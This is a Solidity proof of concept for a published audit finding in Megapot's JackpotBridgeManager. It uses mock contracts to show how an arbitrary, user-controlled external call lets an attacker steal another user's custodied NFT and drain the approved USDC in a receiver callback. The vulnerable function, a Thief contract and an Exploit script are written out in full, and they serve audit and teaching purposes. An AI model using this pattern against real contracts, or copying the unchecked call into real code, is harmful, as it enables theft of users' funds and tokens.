// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Megapot — Attacker can steal JackpotTicketNFTs from JackpotBridgeManager
    (Code4rena 2025-11-megapot, finding #64140, H-01)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _bridgeFunds performs a user-controlled external call after
    optionally approving USDC. Attacker points `to` at the ticket NFT and
    `data` at safeTransferFrom(bridge → thief, victimTokenId); the thief's
    onERC721Received drains the approved USDC so the balance check passes.
    Vulnerable _bridgeFunds body preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockUSDC {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

interface IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
}

/// @notice Minimal ERC721 used as JackpotTicketNFT.
contract JackpotTicketNFT {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external {
        require(ownerOf[tokenId] == from, "not owner");
        ownerOf[tokenId] = to;
        if (to.code.length > 0) {
            require(
                IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, data)
                    == IERC721Receiver.onERC721Received.selector,
                "ERC721"
            );
        }
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        this.safeTransferFrom(from, to, tokenId, "");
    }
}

/// @notice Reduced JackpotBridgeManager — claim path + vulnerable _bridgeFunds.
/// Source: contracts/JackpotBridgeManager.sol @ f0a7297 (L345-L362).
contract JackpotBridgeManager {
    struct RelayTxData {
        address approveTo;
        address to;
        bytes data;
    }

    error BridgeFundsFailed();
    error NotAllFundsBridged();
    error InvalidClaimedAmount();
    error NotTicketOwner();

    MockUSDC public immutable usdc;
    JackpotTicketNFT public immutable jackpotTicketNFT;
    mapping(uint256 => address) public ticketOwner;

    // Simulated jackpot winnings pending claim for the bridge (credited on claim).
    mapping(uint256 => uint256) public ticketWinnings;

    event FundsBridged(address indexed to, uint256 amount);

    constructor(MockUSDC _usdc, JackpotTicketNFT _nft) {
        usdc = _usdc;
        jackpotTicketNFT = _nft;
    }

    /// @dev Seed custody of an NFT + associated claimable USDC winnings.
    function seedCustody(address owner, uint256 ticketId, uint256 winnings) external {
        ticketOwner[ticketId] = owner;
        ticketWinnings[ticketId] = winnings;
        // NFT already minted to this bridge by Exploit
    }

    /// @dev Reduced claimWinnings: validates ownership of attacker's tickets,
    ///      credits winnings into the bridge, then bridges via user-supplied RelayTxData.
    ///      Signature checks omitted (out of scope for this bug).
    function claimWinnings(uint256[] memory _userTicketIds, RelayTxData memory _bridgeDetails) external {
        require(_userTicketIds.length > 0, "no tickets");
        for (uint256 i = 0; i < _userTicketIds.length; i++) {
            if (ticketOwner[_userTicketIds[i]] != msg.sender) revert NotTicketOwner();
        }

        uint256 preUSDCBalance = usdc.balanceOf(address(this));
        // jackpot.claimWinnings — credit winnings for attacker's tickets into the bridge
        uint256 claimed;
        for (uint256 i = 0; i < _userTicketIds.length; i++) {
            claimed += ticketWinnings[_userTicketIds[i]];
            ticketWinnings[_userTicketIds[i]] = 0;
        }
        usdc.mint(address(this), claimed);
        uint256 postUSDCBalance = usdc.balanceOf(address(this));
        uint256 claimedAmount = postUSDCBalance - preUSDCBalance;
        if (claimedAmount == 0) revert InvalidClaimedAmount();

        _bridgeFunds(_bridgeDetails, claimedAmount);
    }

    // ============================================================
    //  Vulnerable _bridgeFunds — JackpotBridgeManager.sol L345-L362
    // ============================================================
    function _bridgeFunds(RelayTxData memory _bridgeDetails, uint256 _claimedAmount) private {
        // Approval address is determined off-chain based on whether depository or approvalProxy is being used
        // If the route requires a direct transfer to a solver the approval address will be 0 and we will
        // skip approval.
        if (_bridgeDetails.approveTo != address(0)) {
            usdc.approve(_bridgeDetails.approveTo, _claimedAmount);
        }

        uint256 preUSDCBalance = usdc.balanceOf(address(this));
        (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data); // @> VULN: user-controlled external call; can invoke NFT.safeTransferFrom to steal custody NFTs

        if (!success) revert BridgeFundsFailed();
        uint256 postUSDCBalance = usdc.balanceOf(address(this));

        if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();
        // FIX: whitelist _bridgeDetails.to / validate RelayTxData before the call

        emit FundsBridged(_bridgeDetails.to, _claimedAmount);
    }
}

/// @notice Attacker-controlled receiver: on ERC721 receive, pull approved USDC.
contract Thief is IERC721Receiver {
    address public bridge;
    MockUSDC public usdc;
    uint256 public stolenTokenId;

    constructor(address _bridge, MockUSDC _usdc) {
        bridge = _bridge;
        usdc = _usdc;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {
        stolenTokenId = tokenId;
        uint256 allowance = usdc.allowance(bridge, address(this));
        if (allowance > 0) {
            require(usdc.transferFrom(bridge, address(this), allowance), "xfer");
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

/// CREATE: usdc(1), nft(2), bridge(3), thief(4)
contract Exploit {
    MockUSDC public usdc;
    JackpotTicketNFT public nft;
    JackpotBridgeManager public bridge;
    Thief public thief;

    address public constant ATTACKER = address(0xA11CE);
    address public constant VICTIM = address(0xB0B);
    uint256 public constant ATTACKER_TICKET = 1;
    uint256 public constant VICTIM_TICKET = 42;
    uint256 public constant WINNINGS = 100e6; // 100 USDC

    constructor() {
        usdc = new MockUSDC();
        nft = new JackpotTicketNFT();
        bridge = new JackpotBridgeManager(usdc, nft);
        thief = new Thief(address(bridge), usdc);
    }

    function run() external {
        // Bridge already holds victim + attacker ticket NFTs in custody
        nft.mint(address(bridge), ATTACKER_TICKET);
        nft.mint(address(bridge), VICTIM_TICKET);
        bridge.seedCustody(ATTACKER, ATTACKER_TICKET, WINNINGS);
        bridge.seedCustody(VICTIM, VICTIM_TICKET, WINNINGS);

        require(nft.ownerOf(VICTIM_TICKET) == address(bridge), "victim nft held");

        // Malicious RelayTxData: call NFT.safeTransferFrom(bridge, thief, victimTicket)
        bytes memory data = abi.encodeWithSignature(
            "safeTransferFrom(address,address,uint256,bytes)",
            address(bridge),
            address(thief),
            VICTIM_TICKET,
            ""
        );
        JackpotBridgeManager.RelayTxData memory relay = JackpotBridgeManager.RelayTxData({
            approveTo: address(thief),
            to: address(nft),
            data: data
        });

        uint256[] memory ids = new uint256[](1);
        ids[0] = ATTACKER_TICKET;

        // Attack as the ticket owner (attacker) — playground records msg.sender = exploit EOA
        // so we prank via direct call from this contract after temporarily re-seeding ownership
        // to address(this) for the claim path (attacker == this for custody check).
        bridge.seedCustody(address(this), ATTACKER_TICKET, WINNINGS);
        bridge.claimWinnings(ids, relay);

        // HARM: victim's NFT is now at the thief; USDC balance check passed via callback drain
        require(nft.ownerOf(VICTIM_TICKET) == address(thief), "harm: NFT not stolen");
        require(thief.stolenTokenId() == VICTIM_TICKET, "harm: token id");
        require(usdc.balanceOf(address(thief)) == WINNINGS, "harm: usdc drained in callback");
        require(usdc.balanceOf(address(bridge)) == 0, "bridge drained");
    }
}
